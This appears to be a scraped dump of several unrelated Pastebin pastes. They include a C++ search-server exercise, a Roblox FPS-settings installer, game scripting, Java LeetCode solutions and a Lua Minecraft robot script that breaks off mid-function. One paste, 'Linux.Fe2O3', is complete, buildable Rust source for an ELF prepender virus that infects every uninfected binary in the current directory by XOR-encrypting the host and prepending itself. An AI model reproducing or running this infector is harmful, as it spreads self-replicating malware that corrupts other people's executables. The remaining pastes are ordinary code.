        <div class=""breadcrumbs-small-screen my-24"">
          <div class=""breadcrumbs-small-screen-image""></div>
          <div class=""breadcrumbs-small-screen-dots "">
            ...
            <div class=""breadcrumbs-arrow""></div>
            <div class=""breadcrumbs-path-hidden-text"">
              <a class=""text-s"" href=""#"">Книги</a>
              <a class=""text-s"" href=""#"">Все книги</a>
              <a class=""text-s"" href=""#"">Художественная литература</a>
              <a class=""text-s"" href=""#"">Русские народные сказки</a>
            </div>
          </div>
          <div class=""breadcrumbs-small-screen-path"">Безработный Дед Мороз. Волшебный круговорот</div>
        </div>
        <div class=""breadcrumbs-icons"">
          <a href=""#"" class=""item_card-external-link""></a>
          <button class=""item_card_add_to_favourite""></button>
        </div>
      </div>"
WV8siEFW,Untitled,zimovid,C++,Friday 16th of June 2023 09:35:06 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        } else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

struct Document {
    int id;
    double relevance;
    int rating;
};

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

class SearchServer {
public:
    int GetDocumentCount() const {
        return static_cast<int>(documents_.size());
    }
    
    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query, int document_id) const {
        const Query query = ParseQuery(raw_query);

        // Check if the document matches the query.
        bool is_match = true;
        if (!query.minus_words.empty()) {  // Check only when there are minus-words.
            for (const string& word : query.minus_words) {
                if (word_to_document_freqs_.count(word) > 0 &&
                    word_to_document_freqs_.at(word).count(document_id) > 0) {
                    is_match = false;  // The document contains a minus-word.
                    break;
                }
            }
        }

        if (is_match) {
            vector<string> matched_words;
            for (const string& word : query.plus_words) {
                if (word_to_document_freqs_.count(word) > 0 &&
                    word_to_document_freqs_.at(word).count(document_id) > 0) {
                    matched_words.push_back(word);
                }
            }
            sort(matched_words.begin(), matched_words.end());
            matched_words.erase(unique(matched_words.begin(), matched_words.end()), matched_words.end());

            return {matched_words, documents_.at(document_id).status};
        } else {
            return {{}, DocumentStatus::IRRELEVANT};
        }
    }
    
    void SetStopWords(const string& text) {
        for (const string& word : SplitIntoWords(text)) {
            stop_words_.insert(word);
        }
    }

    void AddDocument(int document_id, const string& document, DocumentStatus status,
                     const vector<int>& ratings) {
        const vector<string> words = SplitIntoWordsNoStop(document);
        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ComputeAverageRating(ratings), status});
    }

    vector<Document> FindTopDocuments(const string& raw_query,
                                      DocumentStatus status = DocumentStatus::ACTUAL) const {
        const Query query = ParseQuery(raw_query);
        auto matched_documents = FindAllDocuments(query, status);

        sort(matched_documents.begin(), matched_documents.end(),
             [](const Document& lhs, const Document& rhs) {
                 return lhs.relevance > rhs.relevance;
             });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }
        return matched_documents;
    }

private:
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };

    set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    QueryWord ParseQueryWord(string text) const {
        bool is_minus = false;
        // Word shouldn't be empty
        if (text[0] == '-') {
            is_minus = true;
            text = text.substr(1);
        }
        return {text, is_minus, IsStopWord(text)};
    }

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    Query ParseQuery(const string& text) const {
        Query query;
        for (const string& word : SplitIntoWords(text)) {
            const QueryWord query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    query.minus_words.insert(query_word.data);
                } else {
                    query.plus_words.insert(query_word.data);
                }
            }
        }
        return query;
    }

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(documents_.size() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    vector<Document> FindAllDocuments(const Query& query, DocumentStatus status) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                if (documents_.at(document_id).status == status) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                {document_id, relevance, documents_.at(document_id).rating});
        }
        return matched_documents;
    }
};

void PrintMatchDocumentResult(int document_id, const vector<string>& words, DocumentStatus status) {
    cout << ""{ ""s
         << ""document_id = ""s << document_id << "", ""s
         << ""status = ""s << static_cast<int>(status) << "", ""s
         << ""words =""s;
    for (const string& word : words) {
        cout << ' ' << word;
    }
    cout << ""}""s << endl;
}
int main() {
    SearchServer search_server;
    search_server.SetStopWords(""и в на""s);
    search_server.AddDocument(0, ""белый кот и модный ошейник""s,        DocumentStatus::ACTUAL, {8, -3});
    search_server.AddDocument(1, ""пушистый кот пушистый хвост""s,       DocumentStatus::ACTUAL, {7, 2, 7});
    search_server.AddDocument(2, ""ухоженный пёс выразительные глаза""s, DocumentStatus::ACTUAL, {5, -12, 2, 1});
    search_server.AddDocument(3, ""ухоженный скворец евгений""s,         DocumentStatus::BANNED, {9});
    const int document_count = search_server.GetDocumentCount();
    for (int document_id = 0; document_id < document_count; ++document_id) {
        const auto [words, status] = search_server.MatchDocument(""пушистый кот""s, document_id);
        PrintMatchDocumentResult(document_id, words, status);
    }
} 
"
AgnHjnXv,ClientAppSettings Autoinstall,KH0NL,Python,Friday 16th of June 2023 09:11:31 AM CDT,"import os
from time import sleep
user = os.getlogin() 
path = (f'C:/Users\{user}/AppData/Local/Roblox/Versions')
pathfound=False
alrexist=False
list1 = os.listdir(path)
for file in list1:
    list2 = os.listdir(f'C:/Users/{user}/AppData/Local/Roblox/Versions/{file}')
    for x in list2:
        if x == ""RobloxPlayerBeta.exe"": 
            l = (f'C:/Users/{user}/AppData/Local/Roblox/Versions/{file}')
            path=l
            print(l)
            pathfound=True
print(path)
if pathfound == True:
   
    y = os.listdir(path)
    for o in y:
        if o == ""ClientSettings"":
            
            alrexist=True
            break
        else:
            print()

if alrexist == True:
    print(""COULD NOT INSTALL BECAUSE CLIENTSETTING ALREADY EXISTS"")
else:
    folder=""ClientSettings""
    mode=0o666
    s = os.makedirs(f'{path}/ClientSettings',mode)
    zpath = (f'{path}/ClientSettings')
    sleep(1)
    json = open(f'{zpath}/ClientAppSettings.json',""w+"")
    data=['{ \n','  ""DFIntTaskSchedulerTargetFps"": 1000, \n', '  ""FFlagHandleAltEnterFullscreenManually"":""False"" \n', '}']
    json.writelines(data)
    json.close()
print(""DONE!"")
k = input(""press enter to exit prompt"")"
3FGaRDb3,Railgun rails and damage things,Tomasm21,C++,Friday 16th of June 2023 09:05:41 AM CDT,"#library ""SW""
#include ""zcommon.acs""
#include ""zdaemon.acs""

//...
Script 1024 (int lowang){

int i;
int LoWangTID;

if(lowang == 0){

    int x = 0;
    int y = 0;
    int z = 0;
	int xb, yb, zb;
	int railTID = 46000+Various_tags[9];
    Various_tags[9] = Various_tags[9] + 1;    
    if (Various_tags[9] > 999) Various_tags[9] = 0;
	
	thing_changetid(0, railTID);
      
    setactivatortotarget(0); 
 
	LoWangTID = activatorTID();

	for(i = 0; i < 32; i++){
		if(playerLoWangClone[i] == LoWangTID){
			break;
		}
	}
	
	setactorangle(railTID,getactorangle(0));
	
	//Placing a bit - 4pixels to the right from the actor center
	xb = getactorx(railTID) + cos (getactorangle(0)-0.25) * 4;
	yb = getactory(railTID) + sin (getactorangle(0)-0.25) * 4;
	zb = getactorz(railTID);
	
    setactorposition(railTID, xb, yb, zb, 0);
	
	setactivator(railTID);
	for(int j = 0; j < 2; j++){
		activatorsound(""RAILGF2"",255);
	}
	
    while (thingcount(T_NONE,railTID) == 1)
    {
        x = getactorx(railTID);
        y = getactory(railTID);
        z = getactorz(railTID);
		
		//Rail graphics class thing
        spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34000);
        //Damage thing with shorter duration and no rendering style
        spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35000);

        setactorposition(LoWangTID+i*5 + 34000,x,y,z,0);
		setactorposition(LoWangTID+i*5 + 35000,x,y,z,0);
		thing_changetid(LoWangTID+i*5 + 34000, 0);
		thing_changetid(LoWangTID+i*5 + 35000, 0);
		
        delay(1);
    }
//...
}"
KavfNqwm,problem solveing,jakariamasud,Java,Friday 16th of June 2023 09:05:13 AM CDT,"import java.util.*;


public class Utils {
    public static boolean isPalindrome(int x) {
        int temp = x;
        int reverse = 0;

        while (temp > 0) {
            int lastDigit = temp % 10;
            reverse = reverse * 10 + lastDigit;
            temp = temp / 10;
        }
        if (x == reverse) {
            return true;
        }


        return false;
    }

    public static int romanToInt(String s) {
        Map<Character, Integer> values = new HashMap<>();
        int previousValue = 0;
        int sum = 0;
        values.put('I', 1);
        values.put('V', 5);
        values.put('X', 10);
        values.put('L', 50);
        values.put('C', 100);
        values.put('D', 500);
        values.put('M', 1000);
        for (int i = s.length() - 1; i >= 0; i--) {
            char singleChar = s.charAt(i);
            int currentValue = values.get(singleChar);
            if (currentValue >= previousValue) {
                System.out.println(""added value"" + currentValue);
                sum = sum + currentValue;
                previousValue = currentValue;
            } else {
                System.out.println(""subtract value"" + currentValue);
                sum = sum - currentValue;
                previousValue = currentValue;
            }

        }


        return sum;
    }

    public static String longestCommonPrefix(String[] strs) {
        if (strs.length == 0) return """";
        StringBuilder resultString = new StringBuilder();
        String shortestString = String.valueOf(Arrays.stream(strs).min(Comparator.comparing(String::length)).get());
        int minimumLength = shortestString.length();
        for (int i = 0; i < minimumLength; i++) {
            char current = shortestString.charAt(i);
            for (String st : strs) {
                if (st.charAt(i) != current) {
                    System.out.println(""rejecting"" + current);
                    return resultString.toString();
                }

            }
            resultString.append(current);

        }
        return resultString.toString();
    }


    public static boolean isValid(String s) {
        Stack<Character> leftSymbols = new Stack<>();
        for (char bracket : s.toCharArray()) {
            if (bracket == '(' || bracket == '{' || bracket == '[') {
                leftSymbols.push(bracket);
            } else if (bracket == ')' && !leftSymbols.isEmpty() && leftSymbols.peek() == '(') {
                leftSymbols.pop();
            } else if (bracket == ']' && !leftSymbols.isEmpty() && leftSymbols.peek() == '[') {
                leftSymbols.pop();
            } else if (bracket == '}' && !leftSymbols.isEmpty() && leftSymbols.peek() == '{') {
                leftSymbols.pop();
            } else {
                return false;
            }
        }
        return leftSymbols.isEmpty();

    }

    public int removeDuplicates(int[] nums) {
        int uniqueCount = 1;
        for (int i = 1; i < nums.length; i++) {
            if (nums[i] != nums[i - 1]) {
                nums[uniqueCount] = nums[i];
                uniqueCount++;
            }
        }
        return uniqueCount;
    }

    public static int removeElement(int[] nums, int val) {
        int count = 0;
        for (int i = 0; i < nums.length; i++) {
            if (nums[i] != val) {
                nums[count] = nums[i];
                count++;
            }
        }
        return count;


    }

    public void merge(int[] nums1, int m, int[] nums2, int n) {
        for (int i = m; i < m + n; i++) {
            nums1[i] = nums2[i - m];
        }
        Arrays.sort(nums1);

    }

    public int majorityElement(int[] nums) {
        int target = nums.length / 2;
        for (int selectedNum : nums) {
            int count = 0;
            for (int num : nums) {
                if (selectedNum == num) count++;
            }
            if (count > target) return selectedNum;
        }
        return 0;
    }

    public int lengthOfLastWord(String s) {
        if (s == null || s.length() == 0) return 0;
        s = s.trim();
        for (int i = s.length() - 1; i >= 0; i--) {
            if (s.charAt(i) == ' ') {
                return s.substring(i + 1).length();
            }
        }
        return s.length();
    }

    public int strStr(String haystack, String needle) {
        for (int i = 0; i < haystack.length() - needle.length() + 1; i++) {
            if (haystack.substring(i, i + needle.length()).equals(needle)) {
                return i;
            }
        }
        return -1;
    }

    public int maxProfit(int[] prices) {
        if (prices == null || prices.length == 0) return 0;
        int min = prices[0];
        int diff = 0;
        for (int i = 1; i < prices.length; i++) {
            min = Math.min(prices[i], min);
            diff = Math.max(diff, prices[i] - min);
        }
        return diff;
    }

    public boolean hasCycle(ListNode head) {
        if (head == null) return false;
        Set<ListNode> nodeVisited = new HashSet<>();
        while (head.next != null) {
            if (nodeVisited.contains(head)) {
                return true;
            } else {
                nodeVisited.add(head);
            }
            head = head.next;
        }
        return false;
    }

    public ListNode mergeTwoLists(ListNode list1, ListNode list2) {
        ListNode fakeNode = new ListNode(0);
        ListNode p = fakeNode;
        while (list1 != null && list2 != null) {
            if (list1.val < list2.val) {
                p.next = list1;
                list1 = list1.next;
            } else {
                p.next = list2;
                list2 = list2.next;
            }
            p = p.next;
        }
        if (list1 != null) p.next = list1;
        if (list2 != null) p.next = list2;
        return fakeNode.next;
    }

    public ListNode addTwoNumbers(ListNode l1, ListNode l2) {
        ListNode fakeNode = new ListNode(0);
        ListNode current = fakeNode;
        int carry = 0;
        while (l1 != null || l2 != null) {

            int x = l1 != null ? l1.val : 0;
            int y = l2 != null ? l2.val : 0;
            System.out.println(""x :"" + x + ""  y:"" + y);
            int sum = x + y + carry;
            current.next = new ListNode(sum % 10);
            carry = sum / 10;
            current = current.next;
            if (l1 != null) l1 = l1.next;
            if (l2 != null) l2 = l2.next;
        }
        if (carry > 0) current.next = new ListNode(carry);
        return fakeNode.next;
    }

    public boolean isIsomorphic(String s, String t) {
        if (s.length() != t.length()) return false;
        Map<Character, Character> map = new HashMap<>();

        for (int i = 0; i < s.length(); i++) {
            char original = s.charAt(i);
            char replacement = t.charAt(i);

            if (!map.containsKey(original)) {
                if (!map.containsValue(replacement)) {
                    map.put(original, replacement);
                } else return false;
            } else {
                char mappedChar = map.get(original);
                if (mappedChar != replacement) return false;
            }
        }
        return true;

    }

    public boolean isHappy(int n) {
        HashSet<Integer> usedInteger = new HashSet<>();
        while (true) {
            int sum = 0;
            while (n != 0) {
                sum += Math.pow(n % 10, 2.0);
                n = n % 10;
            }
            if (sum == 1) return true;
            n = sum;
            if (usedInteger.contains(n)) return false;
            usedInteger.add(n);
        }


    }

    public ListNode reverseBetween(ListNode head, int left, int right) {
        if (head == null || left == right) return head;
        ListNode previous = null;
        ListNode next = null;
        ListNode current = head;
        ListNode tail = null;
        ListNode header = null;
        int count = 1;
        while (count < left) {
            header = current;
            current = current.next;
            count++;
        }
        tail = current;
        while (count >= left && count <= right) {
            next = current.next;
            current.next = previous;
            previous = current;
            current = next;
            count++;

        }
        if (header != null) header.next = previous;
        tail.next = current;
        return head;

    }

    public ListNode removeNthFromEnd(ListNode head, int n) {
        ListNode start = new ListNode(0);
        start.next = head;
        ListNode fastPtr = start;
        ListNode slowPtr = start;

        for (int i = 1; i <= n; i++) {
            fastPtr = fastPtr.next;
        }
        while (fastPtr.next != null) {
            fastPtr = fastPtr.next;
            slowPtr = slowPtr.next;
        }
        slowPtr.next = slowPtr.next.next;
        return head;

    }
}


"
gBqmzgQw,Linux.Fe2O3 - a POC ELF prepender written in Rust - Source Code,FlyFar,Rust,Friday 16th of June 2023 08:56:25 AM CDT,"/*
 This is an ELF prepender written in Rust by TMZ (2019).
 I like writting prependers on languages that I'm learning and find interesting.

 Linux.Fe2O3 (September 2019) - Simple binary infector written in Rust.
 This version encrypts the host code with a simple XOR and decrypts it at runtime.
 It's almost a direct port from my Nim infector Linux.Cephei and Go infector Linux.Liora.
 
 Build with: rustc main.rs -o Linux.Fe2O3
 
 Note that Rust version used was rustc 1.37.0 (eae3437df 2019-08-13).
 It has no external dependencies so it should compile under most systems (tested under x86_64).
 It's also possible to adapt it to be a PE/Mach infector and compile under Windows/macOS.

 Use at your own risk, I'm not responsible for any damages that this may cause.
 A big shout for those who keeps the scene alive!
 
 Feel free to email me: thomazi@linux.com || guilherme@guitmz.com 
 You can also find me at Twitter @TMZvx || @guitmz
 
 https://www.guitmz.com
*/

use std::ffi::{OsStr, OsString};
use std::fs::File;
use std::io::prelude::*;
use std::io::{Read, SeekFrom, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::process::Command;
use std::{env, fs, process};

const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b""\x7FELF""
const INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@
const XOR_KEY: &[u8; 5] = &[0x46, 0x65, 0x32, 0x4f, 0x33]; // Fe2O3
const VIRUS_SIZE: u64 = 2696496;

fn payload() {
    println!(""Rusting is a chemical reaction of iron in the presence of oxygen.
Common sheet metal rusting in dry air works like this: 4 Fe + 3 O2 --> 2 Fe2O3.
This reaction is relatively slow and produces a thin coating of stable iron oxide Fe2O3, which is (technically) rust, but is a fairly benign form of rust."")
}

fn get_file_size(path: &OsStr) -> u64 {
    let metadata = fs::metadata(&path).unwrap();
    return metadata.len();
}

fn read_file(path: &OsStr) -> Vec<u8> {
    let buf = fs::read(path).unwrap();
    return buf;
}

fn xor_enc_dec(mut input: Vec<u8>) -> Vec<u8> {
    for x in 0..input.len() {
        input[x] = input[x] ^ XOR_KEY[x % XOR_KEY.len()];
    }
    return input;
}

fn is_elf(path: &OsStr) -> bool {
    let mut ident = [0; 4];
    let mut f = File::open(path).unwrap();
    f.read(&mut ident).unwrap();

    if &ident == ELF_MAGIC {
        // this will work for PIE executables as well
        // but can fail for shared libraries during execution
        return true;
    }
    return false;
}

fn is_infected(path: &OsStr) -> bool {
    let file_size: usize = get_file_size(path) as usize;
    let buf = read_file(path);

    for x in 1..file_size {
        if &buf[x] == &INFECTION_MARK[0] {
            for y in 1..INFECTION_MARK.len() {
                if (x + y) >= file_size {
                    break;
                }
                if &buf[x + y] != &INFECTION_MARK[y] {
                    break;
                }
                if y == INFECTION_MARK.len() - 1 {
                    return true;
                }
            }
        }
    }
    return false;
}

fn infect(virus: &OsString, target: &OsStr) {
    let host_buf = read_file(target);
    let mut encrypted_host_buf = xor_enc_dec(host_buf);
    let mut virus_buf = vec![0; VIRUS_SIZE as usize];
    let mut f = File::open(virus).unwrap();
    f.read_exact(&mut virus_buf).unwrap();

    let mut infected = File::create(target).unwrap();
    infected.write_all(&mut virus_buf).unwrap();
    infected.write_all(&mut encrypted_host_buf).unwrap();
    infected.sync_all().unwrap();
    infected.flush().unwrap();
}

fn run_infected_host(path: &OsString) {
    let mut encrypted_host_buf = Vec::new();
    let mut infected = File::open(path).unwrap();

    let plain_host_path = ""/tmp/host"";
    let mut plain_host = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .mode(0o755)
        .open(plain_host_path)
        .unwrap();
    infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();
    infected.read_to_end(&mut encrypted_host_buf).unwrap();
    drop(infected);

    let mut decrypted_host_buf = xor_enc_dec(encrypted_host_buf);
    plain_host.write_all(&mut decrypted_host_buf).unwrap();
    plain_host.sync_all().unwrap();
    plain_host.flush().unwrap();

    drop(plain_host);
    Command::new(plain_host_path).status().unwrap();
    fs::remove_file(plain_host_path).unwrap();
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let myself = OsString::from(&args[0]);

    let current_dir = env::current_dir().unwrap();
    for entry in fs::read_dir(current_dir).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();

        let metadata = fs::metadata(&path).unwrap();
        if metadata.is_file() {
            let entry_name = path.file_name().unwrap();
            if myself == entry_name {
                continue;
            }
            if is_elf(entry_name) {
                if !is_infected(entry_name) {
                    infect(&myself, entry_name);
                }
            }
        }
    }

    if get_file_size(&myself) > VIRUS_SIZE {
        payload();
        run_infected_host(&myself);
    } else {
        process::exit(0)
    }
}"
4VfRpMNi,CropsZaratustra,Chelowek95,Lua,Friday 16th of June 2023 08:46:17 AM CDT,"--Скрипт для робота, для поднятия статов у кропсов или разведения дубликатов (режим задается константой mode)
--Автор: aka_zaratustra осень 2020
local ver = ""1.1.3"" -- версия программы
--Историю версий см. в конце файла
 
-- схема грядки
--|C1|M1|C2
--|M2|C3|M3
--|C4|M4|C5
--|CH|P0|BR
 
-- P0 - исходное положение робота. Робот находится на 1 блок выше кропсов (чтобы мог летать над ними), смотрит на север (в сторону грядок). В руках у робота должна быть лопатка Spade. В первом слоте инвентори робота или должны быть палки или он должен быть пустой (робот сам возьмет и положет туда палки)
-- С[n] - дочерние (разводимые) растения
-- M[n] - материнские растения
-- СН - chest, сундук, куда будут помещаться мешочки с семечками и урожай
-- BR - барель с кропсами(палками)
 
-- В начале работы материнские кропсы должны быть высажены на грядку. Дочерние (разводимые) могут быть высажены, а может быть голая земля.
-- У робота должны в обязательном порядке присутстовать компоненты: Geolyzer, Inventory Upgrade, Inventory Controller Upgrade
-- Рекомендуется для удобства поместить файл с этим скриптом в папку /home/ , а имя файла скрипта добавить в файл /home/.shrc - тогда скрипт будет запускаться при включении робота автоматически
-- Если в бочке кончаются кропсы(палки), робот сломает пустые палки, если они есть на поле и завершит свою работу с ошибкой (чтобы всё поле не сожрали сорняки)
-- Максимальные статы кропсов, выше которых робот поднимать статы выводимых кропсов не будет, задаются константами max_grow и max_gain
-- Стат resistans робот не поднимает, а при возможости опускает до 0
-- Начиная с версии 1.1.3 робот перестал быть уязвим к коллизиям. Нахождение игрока на пути следования робота больше не приводит к потере роботом маршрута. Робот после столкновения с игроком замирает на секунду, после чего продолжает попытку движения.
-- Механизм оценки приемлемости (качества) полученного растения менять в функции howInterestingIsThisCrop(с)
-- При наличии интернет карты в роботе, скрипт в робота можно загрузить командой `pastebin get cZY3P7As -f crop_stats.lua`
 
-- mode:
-- 1 - режим поднятия статов кропсов
-- 2 - режим разведения дубликатов кропсов (НЕ ТЕСТИРОВАЛСЯ! НЕ ИСПОЛЬЗОВАТЬ!)
local mode = 1
-- выше заданных здесь значений робот понимать статы не будет
local max_grow = 12 -- если больше 23, то кроп начинает вести себя как сорняк
local max_gain = 20
local grow_kill = 24 -- значение стата grow, при котором и выше которого робот будет убивать растение на корню
 
local robot = require(""robot"") 
local computer = require(""computer"") 
local component = require(""component"") 
local geo = component.geolyzer
local cropname
 
local c_cropname = {} --имена дочерних кропов
--статы дочерних кропов
local c_gain = {}
local c_grow = {}
local c_resistans = {} 
local c_size = {} 
local c_maxSize = {} 
 
-- статус может принимать значения:
-- ""unknown"" - неисследованный. назначается при старте, дальше не используется
-- ""double crop"" - жердочки
-- ""growing"" - растущий кроп, у которого статы или дошли до целевых или лучше материнских. после вырастания или отправится в сундук или может заменить собой материнский кроп
local c_status = {""unknown"", ""unknown"", ""unknown"", ""unknown"", ""unknown""} -- ""unknown"" для всех пяти дочерних кропов
 
 
local m_gain = {}
local m_grow = {}
local m_resistans = {}
 
local error_string
local bestSeedsSlot --слот в инвентори робота с семенами с лучшими статами
local robotLocation -- текущее местонаходение робота. значение из списка: {""С1"", ""С2"", ... , ""С5"", ""M1"", ""M2"", ""M3"", ""M4"", ""P0""}
 
 
function robot_error(msg)
    print(""Ошибка: "", msg)
    computer.beep(1000,0.3)
    computer.beep(1000,0.3)
    computer.beep(1000,0.3)
    os.exit()
end
 
function robotTryForward() -- роботы пытается сделать шаг вперед, до тех пор, пока ему это не удастся
    while robot.forward() == nil do
        print(""Робот столкнулся с препятствием."")
        os.sleep(1) -- останавливаем робота на 1 секунду
    end
end
--------------------------------------
function get_crop_stat(analyze_result, stat_name) --функция - просматривает таблицу скана блока и возвращает значение поля, имя которого передано в stat_name. если не находит, то возвращает nil
 
    --file = io.open(""log.txt"", ""a"") --файл для лога 
 
    found = false
    for name, v in pairs(analyze_result) do --просмотрим таблицу реультата анализа кропса
        
        pos = string.find(name, stat_name) 
        --print(pos)
        if pos ~=  nil then -- если строку в метадате нашли
            found = true
            --print(v)
            return v
        end
    end
 
end
 
function robotMove_P0_M1()
    --исходное положение P0 смотрит вверх
    robotTryForward()
    robotTryForward()
    robotTryForward()
    --конечное положение M1 смотрит вверх
end
function robotMove_M1_M2()
    --начальное положение M1 смотрит вверх
    robot.turnLeft()
    robotTryForward()
    robot.turnLeft()
    robotTryForward()
    --конечное положение M2 смотрит вниз
end
function robotMove_M2_M3()
    --начальное положение M2 смотрит вниз
    robot.turnLeft()
    robotTryForward()
    robotTryForward()
    --конечное положение M3 смотрит вправо
end
function robotMove_M3_M4()
    --начальное положение M3 смотрит вправо
    robot.turnRight()
    robotTryForward()
    robot.turnRight()
    robotTryForward()
    --конечное положение M4 смотрит влево
end
function robotMove_M4_P0()
    --начальное положение M4 смотрит влево
    robot.turnLeft()
    robotTryForward()
    robot.turnAround()
    --конечное положение P0 смотрит вверх
end
function robotMove_P0_C1()
    --начальное положение P0 смотрит вверх
    robotTryForward()
    robotTryForward()
    robotTryForward()
    robot.turnLeft()
    robotTryForward()
    --конечное положение C1 смотрит влево
end
function robotMove_C1_C4()
    --начальное положение C1 смотрит влево
    robot.turnLeft()
    robotTryForward()
    robotTryForward()
    --конечное положение C4 смотрит вниз
end
function robotMove_C4_C5()
    --начальное положение C4 смотрит вниз
    robot.turnLeft()
    robotTryForward()
    robotTryForward()
    --конечное положение C5 смотрит вправо
end
function robotMove_C5_C2()
    --начальное положение C5 смотрит вправо
    robot.turnLeft()
    robotTryForward()
    robotTryForward()
    --конечное положение C2 смотрит вверх
end
function robotMove_C2_C3()
    --начальное положение C2 смотрит вверх
    robot.turnLeft()
    robotTryForward()
    robot.turnLeft()
    robotTryForward()
    --конечное положение C3 смотрит вниз
end
function robotMove_C3_P0()
    --начальное положение C3 смотрит вниз
    robotTryForward()
    robotTryForward()
    robot.turnAround()
    --конечное положение P0 смотрит вверх
end
function robotGoToParkFrom_M_Crop(m) --едем на парковку. ""m"" - номер материнского кропа с которого мы едем
    if m == 1 then
        --начальное положение M1 смотрит вверх
        robot.turnAround()
        robotTryForward()
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрит вверх
    end
    if m == 2 then
        --начальное положение M2 смотрит влево
        robot.turnAround()
        robotTryForward()
        robot.turnRight()
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрит вверх
    end
    if m == 3 then
        --начальное положение M3 смотрит вправо
        robot.turnAround()
        robotTryForward()
        robot.turnLeft()
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрит вверх
    end
    if m == 4 then
        --начальное положение M4 смотрит влево
        robot.turnLeft()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрит вверх  
    end
end
function robotGoToPark(c) --едем на парковку. ""с"" - номер дочернего кропа с которого мы едем
    if c == 1 then
        --начальное положение C1 смотрит влево
        robot.turnAround()
        robotTryForward()
        robot.turnRight()
        robotTryForward()
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрим вверх
    end
    if c == 2 then
        --начальное положение C2 смотрит вверх
        robot.turnLeft()
        robotTryForward()
        robot.turnLeft()
        robotTryForward()
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрим вверх
    end
    if c == 3 then
        --начальное положение C3 смотрит вниз
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрим вверх
    end
    if c == 4 then
        --начальное положение C4 смотрит вниз
        robot.turnLeft()
        robotTryForward()
        robot.turnRight()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрим вверх
    end
    if c == 5 then
        --начальное положение C5 смотрит вправо
        robot.turnAround()
        robotTryForward()
        robot.turnLeft()
        robotTryForward()
        robot.turnAround()
        --конечное положение P0 смотрим вверх
    end
 
end
function robotGoTo_M_Crop_FromPark(m) --едем с парковки P0 к материнскому кропу. ""m"" - номер кропа к которому мы едем
    if m==1 then
        --исходное положение P0 смотрит вверх
        robotTryForward()
        robotTryForward()
        robotTryForward()
        --конечное положение M1 смотрит вверх
    end
    if m==2 then
        --начальное положение P0 смотрит вверх
        robotTryForward()
        robotTryForward()
        robot.turnLeft()
        robotTryForward()
        --конечное положение M2 смотрит влево
    end
    if m==3 then
        --начальное положение P0 смотрит вверх
        robotTryForward()
        robotTryForward()
        robot.turnRight()
        robotTryForward()
        --конечное положение M3 смотрит вправо
    end
    if m==4 then
        --начальное положение P0 смотрит вверх
        robotTryForward()
        robot.turnLeft()        
        --конечное положение M4 смотрит влево
    end
end
function robotGoTo_C_Crop_FromPark(c) --едем с парковки P0 к дочернему кропу. ""с"" - номер кропа к которому мы едем
    if c == 1 then
        --начальное положение P0 смотрим вверх
        robotTryForward()
        robotTryForward()
        robotTryForward()
        robot.turnLeft()
